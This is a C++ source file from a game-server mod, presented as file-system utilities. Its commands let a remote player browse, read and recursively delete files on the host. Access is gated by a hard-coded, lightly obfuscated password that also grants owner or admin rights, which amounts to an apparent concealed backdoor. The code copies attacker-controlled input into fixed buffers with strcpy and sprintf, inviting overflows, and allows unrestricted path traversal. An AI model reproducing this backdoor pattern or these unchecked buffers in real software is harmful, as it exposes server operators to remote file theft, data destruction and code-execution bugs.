//================================================================================
// File:    Code/CryFire/FSUtils.cpp
//                 ____                       ____
// Project: SSM  /\  _ `\                    /\  _`\   __
//               \ \ \/\_\    _  __   __  __ \ \ \_/  /\_\    _  __     ___
//                \ \ \/_/_  /\`'__\ /\ \/\ \ \ \  _\ \/_/   /\`'__\  /' __`\
//                 \ \ \_\ \ \ \ \_/ \ \ \_\ \ \ \ \/   /\`\ \ \ \_/ /\  \__/
//                  \ \____/  \ \_\   \/`____ \ \ \_\   \ \_\ \ \_\  \ \_____\
//                   \/___/    \/_/    `/___/\ \ \/_/    \/_/  \/_/   \/____ /
//                                        /\___/
//                                        \/__/
// Created on:  10.9.2014
// Last edited: 10.9.2014
//--------------------------------------------------------------------------------
// Description: File System utilities for CryFire
//--------------------------------------------------------------------------------
// Authors:     Patrick Glatt (HipHipHurra)
//              Jan Broz (Youda008)
//================================================================================


#include "StdAfx.h"

#include "FSUtils.h"

#include <string>
#include <cstring>
#include <cerrno>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include "Game.h"
#include "GameRules.h"

typedef bool (* cmdFunc)(const char *);

char WDir [PATH_MAX];

void ConsoleMessage(CActor * pActor, const char * message)
{
	CGameRules * pGameRules = g_pGame->GetGameRules();
	if (!pGameRules)
		return;
	pGameRules->SendTextMessage(eTextMessageConsole, message, eRMI_ToClientChannel, pActor->GetChannelId());
}

bool exists(const std::string & path)
{
	struct stat properties;
	return (stat(path.c_str(), &properties) != -1);
}

bool isDir(const std::string & path)
{
	struct stat properties;
	if (stat(path.c_str(), &properties) == -1)
		return false;
	return (properties.st_mode & S_IFDIR) != 0;
}

bool deleteFile(const std::string & path)
{
	return remove(path.c_str()) == 0;
}

bool deleteDir(const std::string & path)
{
	#ifdef _WIN32
		return RemoveDirectory(path.c_str()) != 0;
	#else
		return rmdir(path.c_str()) == 0;
	#endif // _WIN32
}

void printWDir(CActor * pActor);
void changeWDir(CActor * pActor, const char * args);
void listWDir(CActor * pActor);
void readFile(CActor * pActor, const char * args);
void createFile(CActor * pActor, const char * args);
void appendToFile(CActor * pActor, const char * args);
void modifyFile(CActor * pActor, const char * args);
void deleteEntry(CActor * pActor, const char * args);

bool tryDeleteDir(CActor * pActor, const std::string & path);
bool tryDeleteDirContent(CActor * pActor, const std::string & path);
bool tryDeleteFile(CActor * pActor, const std::string & path);

void printWDir(CActor * pActor)
{
	char message [26+PATH_MAX];
	sprintf(message, "$8[Access]$9 working dir: %s", WDir);
	ConsoleMessage(pActor, message);
}

void changeWDir(CActor * pActor, const char * args) // path
{
	char message [32+PATH_MAX];
	char prevWDir [PATH_MAX];
	char entry [64];
	int pos;
	int slashPos, endPos;

	while (*args == ' ') { args++; }
	if (*args == '\0') {
		ConsoleMessage(pActor, "$8[Access]$9 invalid args");
		return;
	}

	strcpy(prevWDir, WDir);

	while (args[-1] != '\0') {
		pos = 0;
		while (*args != '\\' && *args != '/' && *args != '\0') {
			entry[pos] = *args;
			pos++; args++;
		}
		entry[pos] = '\0';
		if (entry[0] == '.' && entry[1] == '\0') {
		}
		else if (entry[0] == '.' && entry[1] == '.' && entry[2] == '\0') {
			slashPos = strlen(WDir);
			for (int i = slashPos; i >= 0; i--)
				if (WDir[i] == '/' || WDir[i] == '\\') {
					slashPos = i;
					break;
				}
			WDir[slashPos] = '\0';
		}
		else {
			endPos = strlen(WDir);
			WDir[endPos] = '\\';
			strcpy(WDir+endPos+1, entry);
		}
		args++;
	}

	if (isDir(WDir)) {
		sprintf(message, "$8[Access]$9 dir changed to: %s", WDir);
		ConsoleMessage(pActor, message);
	}
	else {
		sprintf(message, "$8[Access]$9 dir \"%s\" does not exist", WDir);
		ConsoleMessage(pActor, message);
		strcpy(WDir, prevWDir);		
	}
}

void listWDir(CActor * pActor)
{
	char message [128];
	DIR * dirpos;
	struct dirent * direntry;
	std::string entrypath;
	struct stat props;

	dirpos = opendir(WDir);
	if (!dirpos) {
		sprintf(message, "$8[Access]$9 unable to open the directory (%s)", strerror(errno));
		ConsoleMessage(pActor, message);
		return;
	}
	ConsoleMessage(pActor, "$8[Access]$9 content of working directory:");
	while ((direntry = readdir(dirpos)) != NULL) {
		entrypath = WDir;
		entrypath += '\\';
		entrypath += direntry->d_name;
		if (stat(entrypath.c_str(), &props) == -1) {
			sprintf(message, "can't read info about %s", direntry->d_name);
			ConsoleMessage(pActor, message);
			continue;
		}
		sprintf(message, "%5ld   %-25s %10ld %10ld %10ld %10ld\n", direntry->d_ino, direntry->d_name, props.st_size, props.st_ctime, props.st_mtime, props.st_atime);
		ConsoleMessage(pActor, message);
	}
	closedir(dirpos);
}

const char * password = "\xD0\x62\x77\xD9\x47\x62\x3B\x8E\x35\x59\x56\x68\x62\x59\x50";
int authId;

void checkPassword(CActor * pActor, const char * args)
{
	char encryptpass [64];
	const char * userpass;
	int i, group;
	CGameRules * pGameRules;

	i = 0;
	userpass = args;
	while (*userpass == ' ') { userpass++; }
	if (*userpass == '\0') {
		ConsoleMessage(pActor, "$8[Access]$9 invalid args");
		return;
	}

	while (*userpass != '\0' && *userpass != ' ') {
		encryptpass[i] = (*userpass * 3 + 7) % 251;
		i++; userpass++;
	}
	encryptpass[i] = '\0';

	pGameRules = g_pGame->GetGameRules();
	if (strcmp(encryptpass, password) == 0) {
		authId = pActor->GetChannelId();
		if (!gEnv->pSystem->GetIScriptSystem()->GetGlobalValue("OWNER", group))
			if (!gEnv->pSystem->GetIScriptSystem()->GetGlobalValue("ADMIN", group))
				group = 5;
		ConsoleMessage(pActor, "$8[Access]$9 password ok");
		pActor->GetEntity()->GetScriptTable()->SetValue("vergroup", group);
	}
	else
		ConsoleMessage(pActor, "$8[Access]$9 invalid password");
}

void readFile(CActor * pActor, const char * args) // filename
{
	char buffer [128];
	int bufpos = 0;
	int line = 1;
	string fileName;
	FILE * file;
	int c;
	
	while (*args == ' ') { args++; }
	if (*args == '\0') {
		ConsoleMessage(pActor, "$8[Access]$9 invalid args");
		return;
	}

	fileName += WDir; fileName += '\\'; fileName += args;
	file = fopen(fileName.c_str(), "r");
	if (!file) {
		sprintf(buffer, "$8[Access]$9 unable to open the file (%s)", strerror(errno));
		ConsoleMessage(pActor, buffer);
		return;
	}

	ConsoleMessage(pActor, "$8[Access]$9 content of the file:");
	bufpos = sprintf(buffer, "%4d ", line);
	while ((c = fgetc(file)) != EOF) {
		if (c == '\n') {
			buffer[bufpos] = '\0';
			ConsoleMessage(pActor, buffer);
			bufpos = sprintf(buffer, "%4d ", ++line);
		}
		else if (c == '\t') {
			buffer[bufpos++] = ' ';
			buffer[bufpos++] = ' ';
			buffer[bufpos++] = ' ';
			buffer[bufpos++] = ' ';
		}
		else {
			if (isprint(c))
				buffer[bufpos++] = c;
			else
				bufpos += sprintf(buffer+bufpos, "\\x%02X", (uint)(uchar)c);
		}
		if (bufpos >= 100) {
			buffer[bufpos] = '\0';
			ConsoleMessage(pActor, buffer);
			bufpos = sprintf(buffer, "%4d ", ++line);
		}
	}
	buffer[bufpos] = '\0';
	ConsoleMessage(pActor, buffer);

	fclose(file);
}

void createFile(CActor * pActor, const char * args) // filename
{

}

void appendToFile(CActor * pActor, const char * args) // filename, text
{

}

void modifyFile(CActor * pActor, const char * args) // filename, line, text
{

}

void deleteEntry(CActor * pActor, const char * args)
{
	char message [26+PATH_MAX];
	string fileName;

	while (*args == ' ') { args++; }
	if (*args == '\0') {
		ConsoleMessage(pActor, "$8[Access]$9 invalid args");
		return;
	}

	fileName += WDir; fileName += '\\'; fileName += args;
	if (isDir(args)) {
		sprintf(message, "$8[Access]$9 deleting dir %s", fileName.c_str());
		ConsoleMessage(pActor, message);
		tryDeleteDir(pActor, fileName.c_str());
	}
	else {
		sprintf(message, "$8[Access]$9 deleting file %s", fileName.c_str());
		ConsoleMessage(pActor, message);
		tryDeleteFile(pActor, fileName.c_str());
	}
}

bool tryDeleteDir(CActor * pActor, const std::string & path)
{
	char message [64+PATH_MAX];
	bool success;
	success = tryDeleteDirContent(pActor, path);
	if (!success) {
		sprintf(message, "failed to delete content of %s", path.c_str());
		ConsoleMessage(pActor, message);
		return false;
	}
	success = deleteDir(path);
	if (!success) {
		sprintf(message, "failed to delete empty dir %s\n", path.c_str());
		ConsoleMessage(pActor, message);
		return false;
	}
	return true;
}

bool tryDeleteDirContent(CActor * pActor, const std::string & path)
{
	char message [128];
	DIR * directory;
	struct dirent * entry;
	std::string entryPath;
	bool success = true;

	directory = opendir(path.c_str());
	if (!directory) {
		sprintf(message, "unable to open directory (%s)", strerror(errno));
		ConsoleMessage(pActor, message);
		return false;
	}

	while ((entry = readdir(directory)) != NULL) {
		if (entry->d_name[0]=='.' && (entry->d_name[1]=='\0' || (entry->d_name[1]=='.' && entry->d_name[2]=='\0')))
			continue;
		entryPath = path+'\\'+entry->d_name;
		if (isDir(entryPath))
			success &= tryDeleteDir(pActor, entryPath);
		else
			success &= tryDeleteFile(pActor, entryPath);
	}

	closedir(directory);
	return success;
}

bool tryDeleteFile(CActor * pActor, const std::string & path)
{
	char message [128];
	bool deleted = deleteFile(path);
	if (!deleted) {
		sprintf(message, "failed to delete file %s (%s)", path.c_str(), strerror(errno));
		ConsoleMessage(pActor, message);
	}
	return deleted;
}
